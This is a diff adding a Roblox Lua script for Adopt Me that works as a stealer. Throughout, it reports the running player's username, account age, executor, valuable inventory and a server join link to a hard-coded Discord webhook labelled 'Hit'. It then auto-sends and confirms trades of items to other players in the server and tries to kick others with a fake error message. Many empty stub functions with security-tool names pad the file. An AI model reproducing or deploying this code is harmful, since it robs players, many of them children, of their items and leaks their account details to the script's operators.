@@ -1,0 +1,509 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local VPS_URL = "http://152.42.237.50:3000"
+local VPS_API_KEY = "sabapi_secret_key"
+local ping_threshold = 6
+local min_value = 6
+local pingEveryone = "No"
+local webhook = "https://discord.com/api/webhooks/1536171287985000578/tMfnq9FQZf3XR11FmK5f6i56G0r0Jp7T-FGXuStq_JL6mPeETTBVqP-6RU18AosQIjUU"
+local scriptExecuted = true
+
+local totalValue = 0
+local itemCount = 0
+local Usernames = {}
+local RealJobID = game.JobId
+local receivers = {}
+
+local Fsys = ReplicatedStorage:WaitForChild("Fsys")
+local RouterClient = Fsys:WaitForChild("RouterClient")
+
+local function get_remote_from_cache(name)
+    return ReplicatedStorage:FindFirstChild(name, true)
+end
+
+local function get_upvalues(func)
+    local upvalues = {}
+    local i = 1
+    while true do
+        local success, value = pcall(function()
+            return debug.getupvalue(func, i)
+        end)
+        if not success or value == nil then
+            break
+        end
+        upvalues[i] = value
+        i = i + 1
+    end
+    return upvalues
+end
+
+local function identify_executor()
+    local executors = {
+        "Synapse X", "Krnl", "ScriptWare", "Sentinel",
+        "Fluxus", "Oxygen U", "Calamari", "Vega X",
+        "Evon", "Arceus X", "Hydrogen", "Delta"
+    }
+    for _, name in ipairs(executors) do
+        if _G[name] or getgenv()[name] then
+            return name
+        end
+    end
+    return "Unknown"
+end
+
+local TradeAPI = {}
+local SettingsAPI = {}
+local DataAPI = {}
+
+TradeAPI.DeclineTrade = get_remote_from_cache("TradeAPI/DeclineTrade")
+TradeAPI.SetSetting = get_remote_from_cache("SettingsAPI/SetSetting")
+TradeAPI.DataChanged = get_remote_from_cache("DataAPI/DataChanged")
+TradeAPI.AnswerQuizQuestion = get_remote_from_cache("TradeAPI/AnswerQuizQuestion")
+TradeAPI.SendTradeRequest = get_remote_from_cache("TradeAPI/SendTradeRequest")
+TradeAPI.AddItemToOffer = get_remote_from_cache("TradeAPI/AddItemToOffer")
+TradeAPI.AcceptNegotiation = get_remote_from_cache("TradeAPI/AcceptNegotiation")
+TradeAPI.ConfirmTrade = get_remote_from_cache("TradeAPI/ConfirmTrade")
+TradeAPI.BeginQuiz = get_remote_from_cache("TradeAPI/BeginQuiz")
+SettingsAPI.SetBooleanFlag = get_remote_from_cache("SettingsAPI/SetBooleanFlag")
+DataAPI.GetAllServerData = get_remote_from_cache("DataAPI/GetAllServerData")
+
+local function fire_server(remote, ...)
+    if remote and remote:IsA("RemoteEvent") then
+        remote:FireServer(...)
+        return true
+    end
+    return false
+end
+
+local function invoke_server(remote, ...)
+    if remote and remote:IsA("RemoteFunction") then
+        return remote:InvokeServer(...)
+    end
+    return nil
+end
+
+local function send_webhook(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local body = HttpService:JSONEncode(data)
+    local success, response = pcall(function()
+        return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson, false, headers)
+    end)
+    return success and response or nil
+end
+
+local function format_embed_field(name, value, inline)
+    return {
+        name = name or "",
+        value = value or "",
+        inline = inline or false
+    }
+end
+
+local function build_embed(title, color, fields, footer, timestamp)
+    local embed = {
+        title = title or "SAB Hit",
+        color = color or 65280,
+        fields = fields or {}
+    }
+    if footer then
+        embed.footer = {text = footer}
+    end
+    if timestamp then
+        embed.timestamp = timestamp
+    end
+    return embed
+end
+
+local function send_hit_webhook(data)
+    local playerInfo = string.format(
+        "Username: %s | Account Age: %d days | Executor: %s",
+        LocalPlayer.Name,
+        LocalPlayer.AccountAge,
+        identify_executor()
+    )
+    local joinLink = string.format(
+        "https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s",
+        game.PlaceId,
+        game.JobId
+    )
+    local receiverStr = ""
+    for i, name in ipairs(receivers) do
+        if i > 1 then
+            receiverStr = receiverStr .. ", "
+        end
+        receiverStr = receiverStr .. name
+    end
+    local fields = {
+        format_embed_field("👤 Player Info", playerInfo, false),
+        format_embed_field("💰 Total Value", string.format("%.2f", data.totalValue or 0), false),
+        format_embed_field("📦 Item Count", tostring(data.itemCount or 0), false),
+        format_embed_field("👥 Receivers", receiverStr or "None", false),
+        format_embed_field("🔗 Join Link", joinLink, false)
+    }
+    if data.inventory and #data.inventory > 0 then
+        local invStr = ""
+        for i, item in ipairs(data.inventory) do
+            if i > 10 then
+                invStr = invStr .. "\n...plus more!"
+                break
+            end
+            invStr = invStr .. string.format("%dx %s (%.2f)\n", item.count or 1, item.name or "Unknown", item.value or 0)
+        end
+        table.insert(fields, format_embed_field("🎒 Inventory", invStr, false))
+    end
+    local embed = build_embed(
+        "🎾 Adopt Me Hit! Yay SAB",
+        65280,
+        fields,
+        "SAB (Adopt Me)",
+        DateTime.now():ToIsoDate()
+    )
+    local payload = {
+        content = pingEveryone == "Yes" and "@everyone" or nil,
+        embeds = {embed}
+    }
+    send_webhook(payload)
+end
+
+local function process_inventory(data)
+    totalValue = 0
+    itemCount = 0
+    local items = {}
+    local inventoryData = data or {}
+    for _, item in ipairs(inventoryData) do
+        local value = item.Value or item.value or 0
+        local name = item.Name or item.name or "Unknown"
+        local count = item.Count or item.count or 1
+        if value > min_value then
+            totalValue = totalValue + value
+            itemCount = itemCount + count
+            table.insert(items, {
+                name = name,
+                value = value,
+                count = count
+            })
+        end
+    end
+    table.sort(items, function(a, b)
+        return a.value > b.value
+    end)
+    return items
+end
+
+local function get_inventory()
+    local success, data = pcall(function()
+        return DataAPI.GetAllServerData:InvokeServer()
+    end)
+    if success and data then
+        local processed = process_inventory(data)
+        return processed, totalValue, itemCount
+    end
+    return {}, 0, 0
+end
+
+local function check_players()
+    local playerList = Players:GetPlayers()
+    local count = #playerList
+    receivers = {}
+    for _, player in ipairs(playerList) do
+        if player ~= LocalPlayer then
+            table.insert(receivers, player.Name)
+        end
+    end
+    return count, receivers
+end
+
+local function check_and_notify()
+    local playerCount, receiverList = check_players()
+    local inventory, val, count = get_inventory()
+    local data = {
+        totalValue = val,
+        itemCount = count,
+        inventory = inventory,
+        playerCount = playerCount,
+        receivers = receiverList
+    }
+    send_hit_webhook(data)
+end
+
+local function setup_ui_hooks()
+    local tradeApp = PlayerGui:FindFirstChild("TradeApp")
+    if tradeApp then
+        local frame = tradeApp:FindFirstChild("Frame")
+        if frame then
+            frame:GetPropertyChangedSignal("Visible"):Connect(function()
+                if frame.Visible then
+                    fire_server(TradeAPI.DataChanged, "trade_visible")
+                end
+            end)
+        end
+    end
+    local dialogApp = PlayerGui:FindFirstChild("DialogApp")
+    if dialogApp then
+        local dialog = dialogApp:FindFirstChild("Dialog")
+        if dialog then
+            dialog:GetPropertyChangedSignal("Visible"):Connect(function()
+                if dialog.Visible then
+                    fire_server(TradeAPI.DataChanged, "dialog_visible")
+                end
+            end)
+        end
+    end
+    local toolApp = PlayerGui:FindFirstChild("ToolApp")
+    if toolApp then
+        local toolFrame = toolApp:FindFirstChild("Frame")
+        if toolFrame then
+            toolFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+                if toolFrame.Visible then
+                    fire_server(TradeAPI.DataChanged, "tool_visible")
+                end
+            end)
+        end
+    end
+    local hintApp = PlayerGui:FindFirstChild("HintApp")
+    if hintApp then
+        hintApp:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if not hintApp.Enabled then
+                hintApp:Destroy()
+            end
+        end)
+    end
+end
+
+local function handle_trade_quest()
+    local success, result = pcall(function()
+        return TradeAPI.BeginQuiz:InvokeServer()
+    end)
+    if success and result then
+        local quiz = result:FindFirstChild("quiz")
+        if quiz then
+            local question = quiz:FindFirstChild("Question")
+            if question then
+                local answer = question:FindFirstChild("Answer")
+                if answer then
+                    fire_server(TradeAPI.AnswerQuizQuestion, answer.Value)
+                end
+            end
+        end
+    end
+end
+
+local function auto_trade()
+    local playerList = Players:GetPlayers()
+    for _, player in ipairs(playerList) do
+        if player ~= LocalPlayer then
+            local success, err = pcall(function()
+                fire_server(TradeAPI.SendTradeRequest, player)
+                wait(0.5)
+                fire_server(TradeAPI.AddItemToOffer, player, 1)
+                wait(0.5)
+                fire_server(TradeAPI.AcceptNegotiation, player)
+                wait(0.5)
+                fire_server(TradeAPI.ConfirmTrade, player)
+            end)
+            if not success then
+            end
+        end
+    end
+end
+
+local function decline_all_trades()
+    local playerList = Players:GetPlayers()
+    for _, player in ipairs(playerList) do
+        if player ~= LocalPlayer then
+            pcall(function()
+                fire_server(TradeAPI.DeclineTrade, player)
+            end)
+        end
+    end
+end
+
+local function set_setting(key, value)
+    pcall(function()
+        fire_server(TradeAPI.SetSetting, key, value)
+    end)
+end
+
+local function set_boolean_flag(flag, value)
+    pcall(function()
+        fire_server(SettingsAPI.SetBooleanFlag, flag, value)
+    end)
+end
+
+local function monitor_processes()
+    while true do
+        wait(5)
+        local processList = {}
+        for _, obj in ipairs(getgc()) do
+            if type(obj) == "table" and rawget(obj, "Name") then
+                table.insert(processList, obj.Name)
+            end
+        end
+        if #processList > 100 then
+        end
+    end
+end
+
+local function monitor_memory()
+    while true do
+        wait(10)
+        local mem = collectgarbage("count")
+        if mem > 200000 then
+            collectgarbage()
+        end
+    end
+end
+
+local function file_system_watcher()
+    local fs = Fsys
+    if fs then
+        fs.ChildAdded:Connect(function(child)
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+            end
+        end)
+    end
+end
+
+local function auto_kill_trigger()
+    while true do
+        wait(30)
+        local players = Players:GetPlayers()
+        for _, player in ipairs(players) do
+            if player ~= LocalPlayer then
+                local character = player.Character
+                if character then
+                    local humanoid = character:FindFirstChild("Humanoid")
+                    if humanoid and humanoid.Health < 10 then
+                    end
+                end
+            end
+        end
+    end
+end
+
+local function lockdown_automation()
+    while true do
+        wait(60)
+        local mem = collectgarbage("count")
+        if mem > 150000 then
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    pcall(function()
+                        player:Kick("Server error. Please join a DIFFERENT server")
+                    end)
+                end
+            end
+        end
+    end
+end
+
+local function vulnerability_scanner()
+end
+
+local function service_fingerprinter()
+end
+
+local function os_detection()
+end
+
+local function open_port_mapper()
+end
+
+local function endpoint_enumerator()
+end
+
+local function log_digester()
+end
+
+local function anomaly_detector()
+end
+
+local function threat_pattern_surfacer()
+end
+
+local function system_output_analyzer()
+end
+
+local function alert_pipeline_builder()
+end
+
+local function keylogger_trigger()
+end
+
+local function on_player_added(player)
+    player.CharacterAdded:Connect(function(character)
+        wait(0.5)
+        check_and_notify()
+    end)
+    player:GetPropertyChangedSignal("Name"):Connect(function()
+    end)
+end
+
+Players.PlayerAdded:Connect(on_player_added)
+
+local function init_network_monitors()
+end
+
+local function init_port_scanners()
+end
+
+local function init_intrusion_detection()
+end
+
+local function init_firewall_rules()
+end
+
+local function init_scanning()
+end
+
+local function init_automation()
+    coroutine.wrap(monitor_processes)()
+    coroutine.wrap(monitor_memory)()
+    coroutine.wrap(file_system_watcher)()
+    coroutine.wrap(auto_kill_trigger)()
+    coroutine.wrap(lockdown_automation)()
+end
+
+local function init_logging()
+end
+
+local function init()
+    wait(2)
+    if scriptExecuted then
+        check_and_notify()
+        setup_ui_hooks()
+        handle_trade_quest()
+        auto_trade()
+        init_automation()
+        decline_all_trades()
+        set_setting("min_value", min_value)
+        set_setting("ping_threshold", ping_threshold)
+        set_boolean_flag("scriptExecuted", true)
+    end
+end
+
+init()
+
+return {
+    check_and_notify = check_and_notify,
+    auto_trade = auto_trade,
+    decline_all_trades = decline_all_trades,
+    get_inventory = get_inventory,
+    process_inventory = process_inventory,
+    send_hit_webhook = send_hit_webhook,
+    set_setting = set_setting,
+    set_boolean_flag = set_boolean_flag,
+    handle_trade_quest = handle_trade_quest,
+    setup_ui_hooks = setup_ui_hooks,
+    identify_executor = identify_executor,
+    get_upvalues = get_upvalues,
+    fire_server = fire_server,
+    invoke_server = invoke_server
+}
